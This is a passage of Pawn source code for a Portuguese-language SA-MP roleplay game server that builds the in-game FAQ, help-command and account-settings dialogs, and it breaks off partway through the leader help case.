#include <YSI_Coding\y_hooks>

//------------------------- Definitions and constants -------------------------
static ChatNoobStatus = true;
static talkChatNoob[MAX_PLAYERS];

//------------------------- Data (This section is for module-internal data. Make sure to make the accessor variable 'static') -------------------------

//------------------------- External API (Functions accessible from other modules. Use 'stock' and PascalCase.) -------------------------
stock ShowPlayerFaqList(playerid)
{
	new titleDialog[10];
    new faqList[858];
    format(titleDialog, sizeof(titleDialog), "FAQ %s", SERVER_TAG);
    strcat(faqList, "1º Começou agora e não sabe o que fazer ?\n");
    strcat(faqList, "2º Como eu faço para localizar um local ?\n");
    strcat(faqList, "3º Nasceu no meio do nada e deseja mudar ?\n");
    strcat(faqList, "4º Como eu consigo um emprego ?\n");
    strcat(faqList, "5º Como eu adquiro level ?\n");
    strcat(faqList, "6º Como eu faço para entrar em contato com outros jogadores?\n");
    strcat(faqList, "7º Como eu adquiro minhas licenças de direção ?\n");
	strcat(faqList, "8º Como eu faço para adquirir armamento ?\n");
	strcat(faqList, "9º Como eu faço para ser um jogador VIP ?\n");
	strcat(faqList, "10º Vim de outro servidor, quero jogar aqui, como edito meu /rg ?\n");
	strcat(faqList, "11º Como eu entro em alguma organização ?\n");
	strcat(faqList, "12º Entrei no meu emprego, não sei o que fazer!\n");
	strcat(faqList, "13º Estou crashando com frequência, o que pode ser ?\n");
	strcat(faqList, "14º Podem mudar meu nick ?\n");
	strcat(faqList, "15º Criei uma conta no fórum, quanto tempo preciso esperar ?\n");
	strcat(faqList, "16º Fiz doação e estou perdido, o que fazer?\n");
	strcat(faqList, "17º Estão te matando sem motivo e não sabe o que fazer ?\n");
	strcat(faqList, "18º Qual a diferença entre Orgs e Empregos ?\n");
    return ShowPlayerDialog(playerid, DIALOG_FAQ_LIST, DIALOG_STYLE_LIST, titleDialog, faqList, "Confirmar", "Cancelar");
}

//------------------------- Internal API (Functions to be used only inside of this module. Use 'static (stock)' and camelCase) -------------------------
static stock ShowHelpDialog(playerid)
{
    new helpList[559];
    strcat(helpList, "{1e90ff}Ajuda » {ffffff}FAQ (Dúvidas Frequentes)\n{1e90ff}Ajuda » {ffffff}Inventário\n{1e90ff}Ajuda » {ffffff}Veículos\n{1e90ff}Ajuda » {ffffff}Veículo Próprio\n{1e90ff}Ajuda » {ffffff}Comandos do Servidor\n{1e90ff}Ajuda » {ffffff}Comandos do SA-MP\n{1e90ff}Ajuda » {ffffff}Casa\n{1e90ff}Ajuda » {ffffff}Empresa\n{1e90ff}Ajuda » {ffffff}Líder\n{1e90ff}Ajuda » {ffffff}Sub-Líder\n{1e90ff}Ajuda » {ffffff}Emprego\n{1e90ff}Ajuda » {ffffff}Organização\n{1e90ff}Ajuda » {ffffff}Acessórios\n{1e90ff}Ajuda » {ffffff}Caixa Surpresa\n{1e90ff}Ajuda » {ffffff}Animações");
    return ShowPlayerDialog(playerid, DIALOG_HELP_LIST, DIALOG_STYLE_LIST, "{FFFFFF}» {1e90ff}Ajuda do Servidor", helpList, "Escolher", "Cancelar");
}

static stock ShowPlayerConfig(playerid)
{
	new configDialog[872 + 1], string[74 + 1];
	strcat(configDialog, "{FFFFFF}Sistema\t{FFFFFF}Informações\n");
	strcat(configDialog, "{0080ff}• {FFFFFF}Gerenciar Tags\t{848484}Clique para Configurar\n");
	switch(Player_GetSpawn(playerid))
	{
		case 0: strcat(configDialog, "{0080ff}• {FFFFFF}Local de Nascimento\t{FFEC8B}Spawn Padrão\n");
		case 1: strcat(configDialog, "{0080ff}• {FFFFFF}Local de Nascimento\t{FFEC8B}Casa\n");
		case 2: strcat(configDialog, "{0080ff}• {FFFFFF}Local de Nascimento\t{FFEC8B}HQ Admin\n");
	}
	// Configurações de Chat
	strcat(configDialog, (Player_GetTerritorialChatStatus(playerid) ? "{0080ff}• {FFFFFF}Mensagens Territoriais\t{04b404}Habilitado\n" : "{0080ff}• {FFFFFF}Mensagens Territoriais\t{f60000}Desabilitado\n"));
	strcat(configDialog, (Player_GetNoobChatStatus(playerid) ? "{0080ff}• {FFFFFF}Mensagens do Chat Dúvida (/n)\t{04b404}Habilitado\n" : "{0080ff}• {FFFFFF}Mensagens do Chat Dúvida (/n)\t{f60000}Desabilitado\n"));
	strcat(configDialog, (Player_GetVipChatStatus(playerid) ? "{0080ff}• {FFFFFF}Mensagens do Chat Vip (/v)\t{04b404}Habilitado\n" : "{0080ff}• {FFFFFF}Mensagens do Chat Vip (/v)\t{f60000}Desabilitado\n"));
	strcat(configDialog, (Player_GetSocioChatStatus(playerid) ? "{0080ff}• {FFFFFF}Mensagens do Chat Sócio (/so)\t{04b404}Habilitado\n" : "{0080ff}• {FFFFFF}Mensagens do Chat Sócio (/so)\t{f60000}Desabilitado\n"));
	strcat(configDialog, (Player_GetMusicStreamStatus(playerid) ? "{0080ff}• {FFFFFF}Música de Interiores\t{04b404}Habilitado\n" : "{0080ff}• {FFFFFF}Música de Interiores\t{f60000}Desabilitado\n"));
	strcat(configDialog, (Player_GetLeaderChatStatus(playerid) ? "{0080ff}• {FFFFFF}Mensagens do Chat Líder (/lchat)\t{04b404}Habilitado\n" : "{0080ff}• {FFFFFF}Mensagens do Chat Líder (/lchat)\t{f60000}Desabilitado\n"));
	// 
	switch(Player_GetDocument(playerid))
	{
		case 0: strcat(configDialog, "{0080ff}• {FFFFFF}RG Personalizado\t{00aaff}[FORMATO MENU]\n");
		case 1: strcat(configDialog, "{0080ff}• {FFFFFF}RG Personalizado\t{00aaff}[TEXTO]\n");
	}
	switch(Player_GetSpeedometer(playerid))
	{
		case 0: strcat(configDialog, "{0080ff}• {FFFFFF}Velocímetro\t{00aaff}Moderno\n");
		case 1: strcat(configDialog, "{0080ff}• {FFFFFF}Velocímetro\t{00aaff}Compacto\n");
	}
	switch(Player_GetTracker(playerid))
	{
		case 0: strcat(configDialog, "{0080ff}• {FFFFFF}Rastreador\t{00aaff}CheckPoint\n");
		case 1: strcat(configDialog, "{0080ff}• {FFFFFF}Rastreador\t{00aaff}Seta\n");
	}
	if (!Player_GetUsingAndroidStatus(playerid))
	{
		strcat(configDialog, "{0080ff}• {FFFFFF}Plataforma\t{FFEC8B}PC\n");
	}
	else
	{
		strcat(configDialog, "{0080ff}• {FFFFFF}Plataforma\t{FFEC8B}Android\n");
	}
	switch(Player_GetScreenSize(playerid))
	{
		case SCREEN_INVALID: strcat(configDialog, "{0080ff}• {FFFFFF}Monitor\t{00aaff}Inválido\n");
		case SCREEN_NORMAL: strcat(configDialog, "{0080ff}• {FFFFFF}Monitor\t{00aaff}16:9\n");
		case SCREEN_ULTRAWIDE: strcat(configDialog, "{0080ff}• {FFFFFF}Monitor\t{00aaff}21:9\n");
	}
	strcat(configDialog, "{0080ff}• {FFFFFF}Menu Hit(Sino do Dano)\t{848484}Clique para Configurar\n");
	format(string, sizeof(string), "{FFFFFF}Configurações da Conta: ({0080ff}%s{FFFFFF})", SERVER_TAG);
	return ShowPlayerDialog(playerid, DIALOG_CONFIG_LIST, DIALOG_STYLE_TABLIST_HEADERS, string, configDialog, "Selecionar", "Fechar");
}

static stock PlayerUpdateSpeedometer(playerid)
{
	new vehicleid = GetPlayerVehicleID(playerid);
	AdaptSpeedometerToScreen(playerid);
	if (IsPlayerInVehicle(playerid, vehicleid) && vehicleid != INVALID_VEHICLE_ID && IsValidVehicle(vehicleid)) 
	{
		UpdatePlayerSpeedometer(playerid, vehicleid, Player_GetSpeedometer(playerid));
		ShowPlayerSpeedometer(playerid, Player_GetSpeedometer(playerid));
		StartSpeedometerTimer(playerid, vehicleid);
		return 1;
	}
	return 0;
}

//------------------------- Implementation (This section contains the concrete implementation for this module inside of the callbacks) -------------------------
hook OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
{
    switch (dialogid)
    {
		case DIALOG_FAQ_LIST:
		{
		    if (!response)
			{
				return SendClientMessage(playerid, COLOR_INVALID, "Você fechou o faq.");
			}
			if (response)
			{
			    switch (listitem)
		        {
		            case 0:
					{
					    new faqMessage[300];
			    		strcat(faqMessage, "Primeiramente, você deve adquirir um emprego, use: /gps e vá até a prefeitura.\n");
	                    strcat(faqMessage, "Se tiver outras dúvidas que não estejam respondidas aqui em nosso FAQ,\n");
	                    strcat(faqMessage, "Entre em contato com a nossa equipe por /relatorio [texto] ou /duvida [texto].\n");
	                    strcat(faqMessage, "Ficaremos felizes em atendê-lo em todas as suas questões.\n");
						ShowPlayerDialog(playerid, DIALOG_FAQ_ITEM, DIALOG_STYLE_MSGBOX, "Começou agora e não sabe o que fazer ?", faqMessage, "Voltar", "Fechar");
					}
					case 1:
					{
					    new faqMessage[121];
			    		strcat(faqMessage, "Digite: /gps e selecione um local, após isso irá aparecer um ponto vermelho em seu mapa.\n");
	                    strcat(faqMessage, "É só ir até o local marcado.\n");
						ShowPlayerDialog(playerid, DIALOG_FAQ_ITEM, DIALOG_STYLE_MSGBOX, "Como eu faço para localizar um local ?", faqMessage, "Voltar", "Fechar");
					}
					case 2:
					{
					    new faqMessage[166];
			    		strcat(faqMessage, "Por padrão os jogadores nascem no último local que esteve antes de sair.\n");
	                    strcat(faqMessage, "Porém é possível mudar o seu nascimento, para isso digite: /config > Local de Nascimento.\n");
						ShowPlayerDialog(playerid, DIALOG_FAQ_ITEM, DIALOG_STYLE_MSGBOX, "Nasceu no meio do nada e deseja mudar ?", faqMessage, "Voltar", "Fechar");
					}
					case 3:
					{
					    new faqMessage[210];
			    		strcat(faqMessage, "Para conseguir um emprego você terá que ir até a prefeitura,\n");
	                    strcat(faqMessage, "Lá você irá encontrar o 'Menu de Empregos'\n");
	                    strcat(faqMessage, "Você deverá escolher um emprego e iniciar sua jornada\n");
	                    strcat(faqMessage, "Não sabe onde fica a prefeitura ? Use: /gps.\n");
						ShowPlayerDialog(playerid, DIALOG_FAQ_ITEM, DIALOG_STYLE_MSGBOX, "Como eu consigo um emprego ?", faqMessage, "Voltar", "Fechar");
					}
					case 4:
					{
					    new faqMessage[185];
			    		strcat(faqMessage, "A cada hora jogada você recebe experiência,\n");
	                    strcat(faqMessage, "Ao chegar a experiência necessária para passar para o próximo level,\n");
	                    strcat(faqMessage, "Você irá passar automaticamente de nível, sem custos adicionais.\n");
						ShowPlayerDialog(playerid, DIALOG_FAQ_ITEM, DIALOG_STYLE_MSGBOX, "Como eu adquiro level ?", faqMessage, "Voltar", "Fechar");
					}
					case 5:
					{
					    new faqMessage[330];
			    		strcat(faqMessage, "Use: /agenda [id] no jogador que você deseja ligar ou enviar sms e anote o número dele.\n");
	                    strcat(faqMessage, "Para efetuar a ligação, digite: /ligar [número de telefone].\n");
	                    strcat(faqMessage, "Para enviar sms, digite: /sms [número de telefone] [mensagem].\n");
	                    strcat(faqMessage, "Agenda e créditos devem ser adquiridos em uma loja de conveniência (24/7) espalhadas pelos mapas. Use: /gps.\n");
						ShowPlayerDialog(playerid, DIALOG_FAQ_ITEM, DIALOG_STYLE_MSGBOX, "Como eu faço para entrar em contato com outros jogadores ?", faqMessage, "Voltar", "Fechar");
					}
					case 6:
					{
					    new faqMessage[232];
			    		strcat(faqMessage, "Você deve possuir +1 hora jogada e possuir o valor necessário da licença.\n");
	                    strcat(faqMessage, "Ao cumprir os requisitos vá até o centro de licenças (/gps) e realize os testes.\n");
	                    strcat(faqMessage, "Cada teste possui regras a serem seguidas, caso contrário você falhará.\n");
						ShowPlayerDialog(playerid, DIALOG_FAQ_ITEM, DIALOG_STYLE_MSGBOX, "Como eu adquiro minhas licenças de direção ?", faqMessage, "Voltar", "Fechar");
					}
					case 7:
					{
					    new faqMessage[280];
			    		strcat(faqMessage, "Você deverá possui mais de 3 horas jogadas para comprar armas.\n");
	                    strcat(faqMessage, "É o tempo necessário para aprender a como funciona o servidor e suas regras.\n");
	                    strcat(faqMessage, "Ao chegar nas horas necessárias, você poderá comprar suas licenças de armas e comprar elas em uma loja de armas ou com um mafioso.\n");
						ShowPlayerDialog(playerid, DIALOG_FAQ_ITEM, DIALOG_STYLE_MSGBOX, "Como eu faço para adquirir armamento ?", faqMessage, "Voltar", "Fechar");
					}
					case 8:
					{
					    new faqMessage[480];
			    		strcat(faqMessage, "Nosso servidor funciona de forma diferente dos demais encontrados no SA-MP.\n");
	                    strcat(faqMessage, "Nós prezamos pela diversão e por isso 90% dos sistemas podem ser aproveitados e comprados com o dinheiro in-game.\n");
	                    strcat(faqMessage, "No entanto, nós precisamos manter o servidor online, o que é bastante custoso.\n");
	                    strcat(faqMessage, "Para isso, possuímos um sistema de VIP que contém algumas vantagens e novidades (/ajuda > Benefícios VIP).\n");
	                    strcat(faqMessage, "Para se tornar um jogador VIP basta fazer uma doação de R$ 10,00 (VIP) ou R$ 20 (VIP Premium).\n");
						ShowPlayerDialog(playerid, DIALOG_FAQ_ITEM, DIALOG_STYLE_MSGBOX, "Como eu faço para ser um jogador VIP ?", faqMessage, "Voltar", "Fechar");
					}
					case 9:
					{
					    new faqMessage[305];
			    		strcat(faqMessage, "Primeiramente, obrigado por confiar em nosso trabalho e vir jogar conosco.\n");
	                    strcat(faqMessage, "Para não começar do 0 novamente, você pode solicitar sua edição de RG no nosso fórum e aguardar um administrar te contatar.\n");
	                    strcat(faqMessage, "Observação: É necessário enviar um print do seu rg antigo no fórum para que você possa ser atendido.\n");
						ShowPlayerDialog(playerid, DIALOG_FAQ_ITEM, DIALOG_STYLE_MSGBOX, "Vim de outro servidor, quero jogar aqui, como edito meu /rg ?", faqMessage, "Voltar", "Fechar");
					}
					case 10:
					{
					    new faqMessage[254];
			    		strcat(faqMessage, "Para entrar em qualquer org do servidor é ncessário falar com o líder ou o sublíder.\n");
	                    strcat(faqMessage, "Para ver os líderes ou sublíderes online, digite respectivamente: /lideres /sublideres.\n");
	                    strcat(faqMessage, "Para falar com os líderes faça uma ligação (/ligar) ou mande um sms (/sms).\n");
						ShowPlayerDialog(playerid, DIALOG_FAQ_ITEM, DIALOG_STYLE_MSGBOX, "Como eu entro em alguma organização ?", faqMessage, "Voltar", "Fechar");
					}
					case 11:
					{
					    new faqMessage[130];
			    		strcat(faqMessage, "Começou sua jornada e não sabe o que fazer ? Está perdido ?\n");
	                    strcat(faqMessage, "Use: /ajuda > Emprego para visualizar seus comandos e boa sorte !\n");
						ShowPlayerDialog(playerid, DIALOG_FAQ_ITEM, DIALOG_STYLE_MSGBOX, "Entrou em um emprego e não sabe o que fazer ?", faqMessage, "Voltar", "Fechar");
					}
					case 12:
					{
					    new faqMessage[175];
			    		strcat(faqMessage, "Mods de aparência de veículos, armas e skins podem causar crashs.\n");
	                    strcat(faqMessage, "Evite usá-los, lembrando que alguns mods são proibidos.\n");
	                    strcat(faqMessage, "Dependendo do mod você poderá sofrer punições.\n");
						ShowPlayerDialog(playerid, DIALOG_FAQ_ITEM, DIALOG_STYLE_MSGBOX, "Estou crashando com frequência, o que pode ser ?", faqMessage, "Voltar", "Fechar");
					}
					case 13:
					{
					    new faqMessage[155];
			    		strcat(faqMessage, "Apenas jogadores VIP's podem realizar a troca de nick com a autorização de um administrador.\n");
	                    strcat(faqMessage, "Um jogador não vip só poderá trocar o nick em caso de bug.\n");
						ShowPlayerDialog(playerid, DIALOG_FAQ_ITEM, DIALOG_STYLE_MSGBOX, "Podem mudar meu nick ?", faqMessage, "Voltar", "Fechar");
					}
					case 14:
					{
					    new faqMessage[195];
			    		strcat(faqMessage, "Diariamente as contas são ativadas por nossos administradores.\n");
	                    strcat(faqMessage, "Então aguarde, pois em breve sua conta será ativada.\n");
	                    strcat(faqMessage, "Observação: Só será ativada as contas que possírem o mesmo nick in game.\n");
						ShowPlayerDialog(playerid, DIALOG_FAQ_ITEM, DIALOG_STYLE_MSGBOX, "Criei uma conta no fórum, quanto tempo preciso esperar ?", faqMessage, "Voltar", "Fechar");
					}
					case 15:
					{
					    new faqMessage[240];
			    		strcat(faqMessage, "Após realizar uma doação vá até o nosso site e vá para seção de Confirmação VIP.\n");
	                    strcat(faqMessage, "Uma vez lá, envie um print do comprovante de pagamento hospedado no imgur.\n");
	                    strcat(faqMessage, "Após enviado o print, aguarde um administrador para liberar seus benefícios.\n");
						ShowPlayerDialog(playerid, DIALOG_FAQ_ITEM, DIALOG_STYLE_MSGBOX, "Fiz doação e estou perdido, o que fazer ?", faqMessage, "Voltar", "Fechar");
					}
					case 16:
					{
					    new faqMessage[211];
			    		strcat(faqMessage, "Matar sem motivo é considerado DM(Death Match).\n");
	                    strcat(faqMessage, "Se isto ocorrer, denuncie o jogador em nosso fórum, o jogador será devidamente punido.\n");
	                    strcat(faqMessage, "Observação: Se aparecer que um contrato foi cumprido em você não é DM.\n");
						ShowPlayerDialog(playerid, DIALOG_FAQ_ITEM, DIALOG_STYLE_MSGBOX, "Estão te matando sem motivo e não sabe o que fazer ?", faqMessage, "Voltar", "Fechar");
					}
					case 17:
					{
					    new faqMessage[640];
			    		strcat(faqMessage, "Os empregos são sua jornada inicial no servidor, é por meio deles que você conseguirá,\n");
	                    strcat(faqMessage, "dinheiro para suas licenças e outras necessidades báscias da sua vida aqui.\n");
	                    strcat(faqMessage, "As organizações são uma forma de emprego mais especializada que exigem mais experiência do jogador,\n");
	                    strcat(faqMessage, "por isso as organizações possuem líderes responsáveis por selecionarem os jogadores preparados para desempenhar o seu papel.\n");
	                    strcat(faqMessage, "As organizações são peças fundamentais no servidor, pois são elas que determinam o ritmo de vida desse mundo.\n");
	                    strcat(faqMessage, "Por isso, a princípio, inicie sua jornada com um emprego e após se adaptar a vida no servidor busque entrar em uma organização.\n");
						ShowPlayerDialog(playerid, DIALOG_FAQ_ITEM, DIALOG_STYLE_MSGBOX, "Qual a diferença entre Orgs e Empregos ?", faqMessage, "Voltar", "Fechar");
					}
				}
			}
		}
		case DIALOG_FAQ_ITEM:
		{
		    if (!response)
			{
				return SendClientMessage(playerid, COLOR_INVALID, "Você fechou o faq.");
			}
			if (response)
			{
			    return ShowPlayerFaqList(playerid);
			}
		}
        case DIALOG_HELP_LIST:
		{
		    if (!response)
			{
				return SendClientMessage(playerid, COLOR_INVALID, "Você fechou a ajuda.");
			}
			if (response)
			{
			    switch (listitem)
		        {
		            case 0:
					{
	     				return ShowHelpDialog(playerid);
					}
		            case 1:
					{
					    new helpMessage[392];
					    strcat(helpMessage, "{0080ff}Opções:\n");
						strcat(helpMessage, "{FFFFFF}USAR: {848484}Usa o item selecionado.\n");
						strcat(helpMessage, "{FFFFFF}VENDER: {848484}Vende o item selecionado para outro jogador.\n");
	                    strcat(helpMessage, "{FFFFFF}DESTRUIR: {848484}Destrói permanentemente o item selecionado.\n");
						strcat(helpMessage, "{FFFFFF}ANUNCIAR: {848484}Anuncia a venda do item selecionado.\n\n");
						strcat(helpMessage, "{ff6347}OBS: {FFFFFF}Para abrir seu inventário digite: {0080ff}(/inventario) {FFFFFF}ou pressione {0080ff}(Y).{FFFFFF}\n");
						ShowPlayerDialog(playerid, DIALOG_HELP_ITEM, DIALOG_STYLE_MSGBOX, "{FFFFFF}Ajuda: {0080ff}Inventário", helpMessage, "Voltar", "Fechar");
						return 1;
					}
					case 2:
					{
					    new helpMessage[327];
					    strcat(helpMessage, "{0080ff}Comandos:\n");
						strcat(helpMessage, "{FFFFFF}/motor: {848484}Liga/Desliga o motor do veículo.\n");
						strcat(helpMessage, "{FFFFFF}/farol: {848484}Liga/Desliga o farol do veículo.\n");
	                    strcat(helpMessage, "{FFFFFF}/mala: {848484}Abre/Fecha o porta-malas do veículo.\n");
						strcat(helpMessage, "{FFFFFF}/camera: {848484}Ativa/Desativa a câmera em primeira pessoa.\n");
						strcat(helpMessage, "{FFFFFF}/flash: {848484}Ativa/Desativa o flash do veículo.\n");
						ShowPlayerDialog(playerid, DIALOG_HELP_ITEM, DIALOG_STYLE_MSGBOX, "{FFFFFF}Ajuda: {0080ff}Veículos", helpMessage, "Voltar", "Fechar");
						return 1;
					}
					case 3:
					{
						return ShowPlayerDialog(playerid, DIALOG_ONLY_READ, DIALOG_STYLE_MSGBOX, "{FFFFFF}Comandos de Veículo Próprio", "{FFFFFF}Comandos de Veículos Próprios:\n\n-> {2e9afe}/meusveiculos - Gerencia todos os seus veículos próprios\n\n{ff6347}Informações:\n\n{0b610b}Sair do jogo: {585858}Toda vez que você sair do jogo, seu veículo sairá junto, e será carregado novamente\nonde estacionou, caso tenha comprado e não estacionado, ele ficará na última posição onde ficou pela última vez.\nAo você spawnar no menu do veículo, a mesma coisa vale para quando o veículo explodir\nserá necessário spawnar ele novamente.\n\n{0b610b}Limite de Veículo: {585858}Jogadores Free poderão ter no máximo 1 veículo próprio, jogadores Vip poderão\npossuir até 5 veículos próprio (dependendo do tipo de Vip). OBS: Caso tenha comprado 5 veículos sendo Vip e\nos dias de VIP acabarem, não precisará se preocupar pois ele ficará para sempre.\n\n{0b610b}Revenda: {585858}Ao revender seu veículo na Revendedora, receberá o valor 3x menor do preço original.", "Fechar", "");
					}
					case 4:
					{
						new helpMessage[1770];
						strcat(helpMessage, "{ff6347}OBS: {FFFFFF}Nem todos os comandos estão listados, portanto, caso tenha dúvidas utilize o chat {0080ff}/n{FFFFFF}.\n\n");
					    strcat(helpMessage, "{FFFFFF}• {0080ff}Lista de comandos e suas respectivas funções:\n");
						strcat(helpMessage, "{FFFFFF}/ajuda: {848484}Obtém informações sobre os sistemas do servidor.\n");
						strcat(helpMessage, "{FFFFFF}/rg: {848484}Visualiza a sua identidade.\n");
	                    strcat(helpMessage, "{FFFFFF}/configuracoes: {848484}Abre as personalizações de modo de jogo.\n");
						strcat(helpMessage, "{FFFFFF}/regras: {848484}Mostra as regras do servidor.\n");
						strcat(helpMessage, "{FFFFFF}/sites: {848484}Mostra as mídias sociais do servidor.\n");
						strcat(helpMessage, "{FFFFFF}/relatorio(/relato): {848484}Solicita um atendimento com um administrador.\n");
						strcat(helpMessage, "{FFFFFF}/anunciar(/an): {848484}Anuncia algo para todos os jogadores.\n");
						strcat(helpMessage, "{FFFFFF}/eu: {848484}Simula uma ação no chat.\n");
						strcat(helpMessage, "{FFFFFF}/pagar: {848484}Dar dinheiro de sua mão para um jogador.\n");
						strcat(helpMessage, "{FFFFFF}/gps: {848484}Localizar um local do servidor.\n");
						strcat(helpMessage, "{FFFFFF}/livrar: {848484}Joga fora itens ilegais.\n");
						strcat(helpMessage, "{FFFFFF}/ejetar: {848484}Expulsa um jogador do veículo.\n");
						strcat(helpMessage, "{FFFFFF}/solicitar: {848484}Solicita por um serviço.\n");
						strcat(helpMessage, "{FFFFFF}/titulos: {848484}Mostra os títulos disponíveis para uso.\n");
						strcat(helpMessage, "{FFFFFF}/mostrarrg: {848484}Mostra sua identidade para um jogador.\n");
						strcat(helpMessage, "{FFFFFF}/procurar: {848484}Procura por um jogador no mapa.\n");
						strcat(helpMessage, "{FFFFFF}/localizar: {848484}Localiza locais importantes do jogador.\n");
						strcat(helpMessage, "{FFFFFF}/minhaslicencas: {848484}Mostra suas habilitações.\n");
						strcat(helpMessage, "{FFFFFF}/habilidades: {848484}Mostra suas habilidades profissionais.\n");
						strcat(helpMessage, "{FFFFFF}/animes: {848484}Mostra os animes do servidor.\n");
						strcat(helpMessage, "{FFFFFF}/inventario: {848484}Abre o inventário do jogador.\n");
						strcat(helpMessage, "{FFFFFF}/dormir: {848484}Ativa o modo dormir.\n");
						strcat(helpMessage, "{FFFFFF}/rank: {848484}Vê o rank de jogadores do servidor.\n");
						strcat(helpMessage, "{FFFFFF}/meusveiculos: {848484}Acessa o menu de veículos próprios do jogador.\n");
						strcat(helpMessage, "{FFFFFF}/acessorios: {848484}Acessa o menu de acessórios equipados do jogador.\n");
						ShowPlayerDialog(playerid, DIALOG_HELP_CMDS1, DIALOG_STYLE_MSGBOX, "{FFFFFF}Listagem de Comandos: {0080ff}1", helpMessage, "Próximo", "Voltar");
						return 1;
					}
					case 5:
					{
						new helpMessage[1999];
						strcat(helpMessage, "{0080ff}/quit (ou /q): {FFFFFF}Fecha o GTA.\n\n");
						strcat(helpMessage, "{0080ff}/fpslimit: {FFFFFF}Este comando define o limite de FPS (quadros por segundo) para o seu jogo.\nQuanto maior o limite, mais suave é o seu jogo. Não tem efeito se o limitador de quadro\nestiver desativado nas opções gráficas. O limite pode ser definido entre 20 e 90.\n\n");
						strcat(helpMessage, "{0080ff}/pagesize: {FFFFFF}É usado para escolher a quantidade de linhas do chat a serem exibidas.\nPode ser de 10 a 20 linhas. O tamanho da página é 10 por padrão.\n\n");
						strcat(helpMessage, "{0080ff}/headmove: {FFFFFF}Este comando irá ativar/desativar os movimentos da cabeça dos personagens.\n\n");
						strcat(helpMessage, "{0080ff}/timestamp: {FFFFFF}Este comando mostrará/ocultará a hora ao lado de todas as mensagens\ndo chat (A hora exibida é a do seu computador, não a do servidor).\n\n");
						strcat(helpMessage, "{0080ff}/dl: {FFFFFF}Este comando ativa/desativa um rótulo em todos os veículos (apenas para você)\nexibindo a identificação do ID do veículo, modelo, lataria e etc.\n\n");
						strcat(helpMessage, "{0080ff}/audiomsg: {FFFFFF}Ativa/Desativa a mensagem que é exibida no chat quando uma URL é transmitida\npara você. Exemplo: Quando um jogador colocar som próximo a você, não vai aparecder o\nLINK da música, apenas irá reproduzir o áudio da URL.\n\n");
						strcat(helpMessage, "{0080ff}/fontsize: {FFFFFF}Altera o tamanho da fonte da interface do usuário (bate-papo, diálogos[menu] e etc).\nO tamanho de letra válido é de -3 a 5.\n\n");
						strcat(helpMessage, "{0080ff}/meustatus: {FFFFFF}Comando para exibir um menu com informações de sua CONEXÃO.\n\n\n");
						strcat(helpMessage, "{848484}Teclas de Atalho:.\n");
						strcat(helpMessage, "{FFFFFF}[TAB] - {848484}Exibe informações dos jogadores conectados, como: level, ping e etc.\n");
						strcat(helpMessage, "{FFFFFF}[F5] - {848484}Exibe as estatísticas de largura de banda (Conexão).\n");
						strcat(helpMessage, "{FFFFFF}[F7] - {848484}Altera o CHAT do Servidor (Oculta ou diminui o brilho).\n");
						strcat(helpMessage, "{FFFFFF}[F5] - {848484}Tira um a print(Screenshot) da tela. (Pasta: GTA San Andreas User Files).\n");
						strcat(helpMessage, "{FFFFFF}[F9] - {848484}Oculta/Mostra o chatkill.\n");
						strcat(helpMessage, "{FFFFFF}[T] - {848484}Abre o chat do servidor para inserior comandos ou mensagens.\n");
						strcat(helpMessage, "{FFFFFF}[G] - {848484}Entra em um veículo como passageiro.\n");
						ShowPlayerDialog(playerid, DIALOG_HELP_ITEM, DIALOG_STYLE_MSGBOX, "{FFFFFF}Comandos do: {0080ff}SA-MP", helpMessage, "Voltar", "Fechar");
						return 1;
					}
					case 6:
					{
						/*if (playerInfo[playerid][pHouseKey] == UNDEFINED_HOUSE)
						{
							return SendClientMessage(playerid, COLOR_INVALID, "Você não possui uma casa.");
						}*/
						new helpMessage[246];
					    strcat(helpMessage, "{0080ff}Comandos:\n");
						strcat(helpMessage, "{FFFFFF}/chave: {848484}Tranca/Destranca a casa.\n");
						strcat(helpMessage, "{FFFFFF}/abandonarcasa: {848484}Vende a casa para o governo.\n");
	                    strcat(helpMessage, "{FFFFFF}/vendercasa: {848484}Vende a casa para um jogador.\n");
						strcat(helpMessage, "{FFFFFF}/menucasa: {848484}Acessa as opções da casa.\n");
						ShowPlayerDialog(playerid, DIALOG_HELP_ITEM, DIALOG_STYLE_MSGBOX, "{FFFFFF}Ajuda: {0080ff}Casa", helpMessage, "Voltar", "Fechar");
						return 1;
					}
					case 7:
					{
						/*if (playerInfo[playerid][pCompanyKey] == UNDEFINED_BIZZ)
						{
							return SendClientMessage(playerid, COLOR_INVALID, "Você não possui uma empresa.");
						}*/
						new helpMessage[268];
					    strcat(helpMessage, "{0080ff}Comandos:\n");
						strcat(helpMessage, "{FFFFFF}/chaveb: {848484}Tranca/Destranca a empresa.\n");
						strcat(helpMessage, "{FFFFFF}/abandonarempresa: {848484}Vende a empresa para o governo.\n");
	                    strcat(helpMessage, "{FFFFFF}/venderempresa: {848484}Vende a empresa para um jogador.\n");
						strcat(helpMessage, "{FFFFFF}/menuempresa: {848484}Acessa as opções da empresa.\n");
						ShowPlayerDialog(playerid, DIALOG_HELP_ITEM, DIALOG_STYLE_MSGBOX, "{FFFFFF}Ajuda: {0080ff}Empresa", helpMessage, "Voltar", "Fechar");
						return 1;
					}
					case 8:
					{
					    if (Player_GetOrgRole(playerid) != 6)
						{
						    return SendClientMessage(playerid, COLOR_INVALID, "Você não é um líder.");
						}
						//
						new helpMessage[664];
					    strcat(helpMessage, "{0080ff}Comandos destinados aos líderes:\n");
						strcat(helpMessage, "{FFFFFF}/convidar: {848484}Convida um jogador para a organização.\n");
						strcat(helpMessage, "{FFFFFF}/promover: {848484}Promove um jogador a um cargo superior.\n");
	                    strcat(helpMessage, "{FFFFFF}/demitir: {848484}Demiti um jogador da organização.\n");
						strcat(helpMessage, "{FFFFFF}/addblacklist: {848484}Adiciona um jogador à blacklist.\n");
						strcat(helpMessage, "{FFFFFF}/rblacklist: {848484}Remove um jogador da blacklist.\n");
						strcat(helpMessage, "{FFFFFF}/lchat: {848484}Chat dos líderes e sub-líderes do servidor.\n");
						/*if (IsACop(playerid))
						{
							strcat(helpMessage, "{FFFFFF}/rmbq: {848484}Remove todos os bloqueios.\n");
							strcat(helpMessage, "{FFFFFF}/rmbr: {848484}Remove todas as barreiras.\n");
							strcat(helpMessage, "{FFFFFF}/rmpr: {848484}Remove todos os tapetes de pregos.\n");
						}
						if (IsAGoverno(playerid))
						{
							strcat(helpMessage, "{FFFFFF}/mudarimposto: {848484}Altera o valor do imposto de renda.\n");
						}*/
						ShowPlayerDialog(playerid, DIALOG_HELP_ITEM, DIALOG_STYLE_MSGBOX, "{FFFFFF}Ajuda: {0080ff}Líderes", helpMessage, "Voltar", "Fechar");
						return 1;
					}
					case 9:
					{
					    if (Player_GetOrgRole(playerid) != 5)
						{
